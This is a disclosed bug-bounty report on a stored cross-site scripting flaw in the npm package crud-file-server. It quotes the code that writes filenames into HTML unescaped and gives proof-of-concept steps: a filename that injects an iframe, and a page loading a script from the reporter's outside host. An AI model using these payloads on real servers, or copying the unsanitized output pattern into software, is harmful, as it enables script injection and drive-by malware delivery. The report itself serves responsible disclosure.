# [crud-file-server] Stored XSS in filenames when directory index is served by crud-file-server

## Report Details
- **Report ID**: 311101
- **URL**: https://hackerone.com/reports/311101
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-01-31T20:38:25.774Z
- **Disclosed**: 2018-02-17T17:51:51.597Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

**crud-file-server** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.

## Module

**crud-file-server**

This package exposes a directory and its children to create, read, update, and delete operations over http.

https://www.npmjs.com/package/crud-file-server

version: 0.7.0

Stats
0 downloads in the last day
26 downloads in the last week
220 downloads in the last month

~2500 estimated downloads per year


## Description

This vulnerability exists, because ```name``` which represents filename(s) is output in HTML without any sanitization. This allows to embed malicious code in filenames listed in directory:

```javascript
// node_modules/crud-file-server/crud-file-server.js, line 137
    res.setHeader('Content-Type', 'text/html');											
    res.write('<html><body>');
    for(var f = 0; f < results.length; f++) {
        var name = results[f].name;
        var normalized = url + '/' + name;
        while(normalized[0] == '/') { normalized = normalized.slice(1, normalized.length); }
        res.write('\r\n<p><a href="/' + normalized + '">' + name + '</a></p>');
    }
    res.end('\r\n</body></html>');
```
## PoC - Steps To Reproduce:

- install ```crud-file-server```

```
$ npm install crud-file-server
```


- in the directory which will be served via ```crud-file-server```, create file with following name:

```
"><iframe src="malware_frame.html">
```

- create second file with name ```malware_frame.html``` with following content and save it in the same directory:


```
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="http://bl4de.tech/poc.js"></script>
</body>

</html>
```

Run ```crud-file-server``` in directory with file with changed filename:

```
$ ./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080

usage:
  crud-file-server [options]

this starts a file server using the specified command-line options

options:

  -f file system path to expose over http
  -h log head requests
  -p port to listen on (example, 80)
  -q suppress this message
  -r read only
  -v virtual path to host the file server on

example:

  crud-file-server -f c:/ -p 8080 -q -v filez

listening on :8080/, serving ./
```

and open ```http://127.0.0.1:8000``` in the browser. You will notice an alert served from bl4de.tech, executed in context of page with directory index:

{F259251}


## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability can be used to eg. download malware via "drive-by-download" attacks. Also, as described in other modules I've reported similar vulnerabilty, an iframe with malicious JS file loaded from external resource can be executed.

## Attachments
- 1.png
